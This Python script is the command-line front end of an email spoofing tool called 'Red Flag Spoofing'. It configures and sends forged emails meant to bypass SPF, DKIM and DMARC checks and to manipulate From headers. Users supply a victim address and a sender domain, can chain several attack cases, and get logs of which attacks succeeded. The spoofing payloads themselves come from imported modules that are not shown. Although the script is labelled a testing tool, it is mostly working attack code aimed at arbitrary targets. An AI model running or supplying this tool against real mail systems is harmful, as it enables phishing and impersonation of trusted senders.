#!/usr/bin/env python3

import sys
import argparse
from colorama import init, Fore, Style
from typing import Dict, Any, Optional, List, Tuple
import json
import dns.resolver
import socket
import time
from datetime import datetime
from pathlib import Path
import csv
from common.common import get_date, id_generator, get_mail_server_from_email_address
from common.mail_sender import MailSender
from exploits_builder import ExploitsBuilder
import testcases
import config

class AttackResult:
    def __init__(self, success: bool, details: Dict[str, Any], smtp_response: str = ""):
        self.success = success
        self.details = details
        self.smtp_response = smtp_response
        self.timestamp = datetime.now()

class EmailSpoofingTester:
    def __init__(self):
        self.config = config.config
        self.test_cases = testcases.test_cases
        self.results_dir = Path("attack_results")
        self.results_dir.mkdir(exist_ok=True)
        
    def banner(self):
        print(f"{Fore.RED}")
        print("""
╔═══╗     ╔╗         ╔═══╗                    ╔═══╗ 
║╔═╗║     ║║         ║╔═╗║                    ║╔═╗║ 
║╚═╝║╔══╗ ║║ ╔══╗    ║╚══╗╔══╗ ╔══╗ ╔══╗╔══╗ ║╚═╝║ 
║╔╗╔╝║╔╗║ ║║ ║══╣    ╚══╗║║╔╗║ ║╔╗║ ║╔╗║║╔╗║ ║╔══╝ 
║║║╚╗║╚╝║ ║╚╗╠══║    ║╚═╝║║╚╝║ ║╚╝║ ║╚╝║║╚╝║ ║║    
╚╝╚═╝╚══╝ ╚═╝╚══╝    ╚═══╝╚══╝ ║╔═╝ ╚══╝╚══╝ ╚╝    
                                ║║                    
                                ╚╝                    
Red Flag Spoofing - Advanced Email Authentication Testing Tool
        """)
        print(f"{Style.RESET_ALL}")

    def validate_dns_records(self, domain: str) -> Tuple[bool, List[str]]:
        """Validate required DNS records for the domain"""
        issues = []
        success = True
        
        try:
            # Check SPF record
            try:
                answers = dns.resolver.resolve(domain, 'TXT')
                spf_found = False
                for rdata in answers:
                    for txt_string in rdata.strings:
                        if txt_string.startswith(b'v=spf1'):
                            spf_found = True
                            break
                if not spf_found:
                    issues.append(f"No SPF record found for {domain}")
                    success = False
            except dns.resolver.NXDOMAIN:
                issues.append(f"Domain {domain} does not exist")
                success = False
            except Exception as e:
                issues.append(f"Error checking SPF record: {str(e)}")
                success = False

            # Check DKIM record
            try:
                dns.resolver.resolve(f"selector._domainkey.{domain}", 'TXT')
            except dns.resolver.NXDOMAIN:
                issues.append(f"No DKIM record found for selector._domainkey.{domain}")
                success = False
            except Exception as e:
                issues.append(f"Error checking DKIM record: {str(e)}")
                success = False

            # Check MX record
            try:
                dns.resolver.resolve(domain, 'MX')
            except dns.resolver.NoAnswer:
                issues.append(f"No MX record found for {domain}")
                success = False
            except Exception as e:
                issues.append(f"Error checking MX record: {str(e)}")
                success = False

        except Exception as e:
            issues.append(f"DNS validation error: {str(e)}")
            success = False

        return success, issues

    def validate_smtp_connection(self, host: str, port: int = 25) -> Tuple[bool, str]:
        """Test SMTP connection to target server"""
        try:
            sock = socket.create_connection((host, port), timeout=10)
            sock.close()
            return True, "SMTP connection successful"
        except Exception as e:
            return False, f"SMTP connection failed: {str(e)}"

    def list_attack_categories(self):
        """Display available attack categories with detailed descriptions"""
        categories = {
            "SPF Bypass": {
                "description": "Attacks targeting Sender Policy Framework vulnerabilities",
                "cases": ["server_a1", "server_a2", "server_a5", "server_a6", "server_a7"]
            },
            "DKIM Bypass": {
                "description": "Attacks targeting DomainKeys Identified Mail vulnerabilities",
                "cases": ["server_a3", "server_a4"]
            },
            "Header Manipulation": {
                "description": "Attacks exploiting email header parsing vulnerabilities",
                "cases": ["server_a8", "server_a9", "server_a10", "server_a11"]
            },
            "From Header Attacks": {
                "description": "Specialized attacks targeting From header processing",
                "cases": ["server_a12", "server_a13", "server_a14", "server_a15"]
            },
            "Advanced Techniques": {
                "description": "Complex attacks combining multiple vectors",
                "cases": ["server_a16", "server_a17"]
            },
            "Client Mode Attacks": {
                "description": "Attacks targeting email client vulnerabilities",
                "cases": [case for case in self.test_cases.keys() if case.startswith("client_")]
            }
        }
        
        print(f"\n{Fore.CYAN}Available Attack Categories:{Style.RESET_ALL}")
        print("=" * 50)
        
        for category, info in categories.items():
            print(f"\n{Fore.GREEN}{category}:{Style.RESET_ALL}")
            print(f"Description: {info['description']}")
            print("-" * len(category))
            for case in info['cases']:
                desc = self.test_cases[case]["description"].decode('utf-8')
                print(f"  {Fore.YELLOW}{case}{Style.RESET_ALL}: {desc}")

    def configure_attack(self, case_id: str, target_email: str, 
                        sender_domain: str, custom_body: Optional[str] = None) -> Dict[str, Any]:
        """Configure attack parameters with validation"""
        if case_id not in self.test_cases:
            raise ValueError(f"Invalid case_id: {case_id}")
            
        # Validate domain configuration
        dns_valid, issues = self.validate_dns_records(sender_domain)
        if not dns_valid:
            print(f"{Fore.YELLOW}Warning: DNS configuration issues detected:{Style.RESET_ALL}")
            for issue in issues:
                print(f"  - {issue}")
                
        config = self.config.copy()
        config["case_id"] = case_id.encode('utf-8')
        config["victim_address"] = target_email.encode('utf-8')
        config["attacker_site"] = sender_domain.encode('utf-8')
        
        if custom_body:
            config["body"] = custom_body.encode('utf-8')
            
        return config

    def analyze_smtp_response(self, response: str) -> Dict[str, Any]:
        """Analyze SMTP server response for authentication results"""
        analysis = {
            "spf_result": "unknown",
            "dkim_result": "unknown",
            "dmarc_result": "unknown",
            "status_code": None,
            "error_messages": []
        }
        
        try:
            # Parse SMTP response codes
            lines = response.split('\n')
            for line in lines:
                if line.strip():
                    code = line[:3]
                    if code.isdigit():
                        analysis["status_code"] = int(code)
                    
                    # Look for authentication results
                    lower_line = line.lower()
                    if "spf=" in lower_line:
                        analysis["spf_result"] = lower_line.split("spf=")[1].split()[0]
                    if "dkim=" in lower_line:
                        analysis["dkim_result"] = lower_line.split("dkim=")[1].split()[0]
                    if "dmarc=" in lower_line:
                        analysis["dmarc_result"] = lower_line.split("dmarc=")[1].split()[0]
                        
                    # Check for common error messages
                    if any(err in lower_line for err in ["error", "failed", "reject"]):
                        analysis["error_messages"].append(line.strip())
                        
        except Exception as e:
            analysis["error_messages"].append(f"Analysis error: {str(e)}")
            
        return analysis

    def save_attack_result(self, result: AttackResult, case_id: str, target: str):
        """Save attack results to CSV and detailed log"""
        timestamp = result.timestamp.strftime("%Y%m%d_%H%M%S")
        
        # Save to CSV
        csv_file = self.results_dir / "attack_results.csv"
        csv_exists = csv_file.exists()
        
        with open(csv_file, 'a', newline='') as f:
            writer = csv.writer(f)
            if not csv_exists:
                writer.writerow(["Timestamp", "Case ID", "Target", "Success", "SPF", "DKIM", "DMARC"])
            writer.writerow([
                timestamp,
                case_id,
                target,
                result.success,
                result.details.get("spf_result", "unknown"),
                result.details.get("dkim_result", "unknown"),
                result.details.get("dmarc_result", "unknown")
            ])
        
        # Save detailed log
        log_file = self.results_dir / f"attack_log_{timestamp}.json"
        with open(log_file, 'w') as f:
            json.dump({
                "timestamp": timestamp,
                "case_id": case_id,
                "target": target,
                "success": result.success,
                "details": result.details,
                "smtp_response": result.smtp_response
            }, f, indent=4)

    def execute_attack(self, case_id: str, target_email: str, 
                      sender_domain: str, mode: str = 's', 
                      custom_body: Optional[str] = None,
                      starttls: bool = False) -> AttackResult:
        """Execute attack with enhanced validation and reporting"""
        try:
            print(f"\n{Fore.CYAN}[*] Validating attack prerequisites...{Style.RESET_ALL}")
            
            # Configure the attack
            attack_config = self.configure_attack(case_id, target_email, sender_domain, custom_body)
            
            # Set the mode
            attack_config['mode'] = mode
            
            # Create exploit builder
            exploits_builder = ExploitsBuilder(self.test_cases, attack_config)
            smtp_seqs = exploits_builder.generate_smtp_seqs()
            
            # Configure mail sender based on mode
            if mode == 's':  # Server mode
                mail_server = attack_config["server_mode"]['recv_mail_server']
                if not mail_server:
                    mail_server = get_mail_server_from_email_address(attack_config["victim_address"])
                port = attack_config["server_mode"]['recv_mail_server_port']
                
                # Validate SMTP connection
                conn_success, conn_msg = self.validate_smtp_connection(mail_server, port)
                if not conn_success:
                    print(f"{Fore.RED}[!] {conn_msg}{Style.RESET_ALL}")
                    return AttackResult(False, {"error": conn_msg})
                
                mail_sender = MailSender()
                mail_sender.set_param(
                    (mail_server, port),
                    helo=smtp_seqs["helo"],
                    mail_from=smtp_seqs["mailfrom"],
                    rcpt_to=smtp_seqs["rcptto"],
                    email_data=smtp_seqs["msg_content"],
                    starttls=starttls
                )
                
            elif mode == 'c':  # Client mode
                mail_server = attack_config["client_mode"]["sending_server"]
                if not mail_server:
                    return AttackResult(False, {"error": "No sending server configured for client mode"})
                
                mail_sender = MailSender()
                mail_sender.set_param(
                    mail_server,
                    helo=b"espoofer-client.local",
                    mail_from=smtp_seqs["mailfrom"],
                    rcpt_to=smtp_seqs["rcptto"],
                    email_data=smtp_seqs["msg_content"],
                    starttls=True,
                    mode="client",
                    username=attack_config["client_mode"]['username'],
                    password=attack_config["client_mode"]['password']
                )
            
            print(f"{Fore.CYAN}[*] Executing attack...{Style.RESET_ALL}")
            
            # Execute the attack
            success = mail_sender.send_email()
            smtp_response = mail_sender.get_last_response()
            
            # Analyze results
            analysis = self.analyze_smtp_response(smtp_response)
            
            result = AttackResult(success, analysis, smtp_response)
            
            # Save results
            self.save_attack_result(result, case_id, target_email)
            
            return result
            
        except Exception as e:
            error_msg = f"Error executing attack: {str(e)}"
            print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
            return AttackResult(False, {"error": error_msg})

    def chain_attacks(self, target_email: str, sender_domain: str, 
                     attack_sequence: List[str], mode: str = 's') -> List[AttackResult]:
        """Execute a sequence of attacks and analyze combined results"""
        results = []
        print(f"\n{Fore.CYAN}[*] Initiating attack chain...{Style.RESET_ALL}")
        
        for case_id in attack_sequence:
            print(f"\n{Fore.YELLOW}[*] Executing attack case: {case_id}{Style.RESET_ALL}")
            result = self.execute_attack(case_id, target_email, sender_domain, mode)
            results.append(result)
            
            if not result.success:
                print(f"{Fore.RED}[!] Attack chain broken at {case_id}{Style.RESET_ALL}")
                break
                
            # Add delay between attacks
            time.sleep(2)
            
        return results

def main():
    init()  # Initialize colorama
    tester = EmailSpoofingTester()
    
    parser = argparse.ArgumentParser(description="Red Flag Spoofing - Advanced Email Authentication Testing Tool")
    parser.add_argument("-l", "--list", action="store_true", help="List all available attack categories and cases")
    parser.add_argument("-m", "--mode", choices=['s', 'c'], default='s', help="Operation mode: server (s) or client (c)")
    parser.add_argument("-id", "--case-id", help="Specific test case ID to execute")
    parser.add_argument("-t", "--target", help="Target email address")
    parser.add_argument("-d", "--domain", help="Sender domain")
    parser.add_argument("-b", "--body", help="Custom email body")
    parser.add_argument("--tls", action="store_true", help="Enable STARTTLS")
    parser.add_argument("--chain", help="Execute a chain of attacks (comma-separated case IDs)")
    
    args = parser.parse_args()
    
    # Show banner
    tester.banner()
    
    if args.list:
        tester.list_attack_categories()
        return
        
    if not all([args.target, args.domain]) or (not args.case_id and not args.chain):
        parser.error("--target, --domain, and either --case-id or --chain are required unless --list is specified")
    
    if args.chain:
        # Execute attack chain
        attack_sequence = [x.strip() for x in args.chain.split(',')]
        results = tester.chain_attacks(args.target, args.domain, attack_sequence, args.mode)
        
        print(f"\n{Fore.CYAN}Attack Chain Results:{Style.RESET_ALL}")
        for i, result in enumerate(results):
            status = f"{Fore.GREEN}Success" if result.success else f"{Fore.RED}Failed"
            print(f"{attack_sequence[i]}: {status}{Style.RESET_ALL}")
            
    else:
        # Execute single attack
        print(f"\n{Fore.CYAN}[*] Executing attack case: {args.case_id}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target email: {args.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Sender domain: {args.domain}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Mode: {'Server' if args.mode == 's' else 'Client'}{Style.RESET_ALL}")
        
        result = tester.execute_attack(
            args.case_id,
            args.target,
            args.domain,
            args.mode,
            args.body,
            args.tls
        )
        
        if result.success:
            print(f"\n{Fore.GREEN}[+] Attack executed successfully!{Style.RESET_ALL}")
            print("\nAuthentication Results:")
            print(f"SPF: {result.details.get('spf_result', 'unknown')}")
            print(f"DKIM: {result.details.get('dkim_result', 'unknown')}")
            print(f"DMARC: {result.details.get('dmarc_result', 'unknown')}")
        else:
            print(f"\n{Fore.RED}[-] Attack execution failed!{Style.RESET_ALL}")
            if "error" in result.details:
                print(f"Error: {result.details['error']}")

if __name__ == "__main__":
    main() 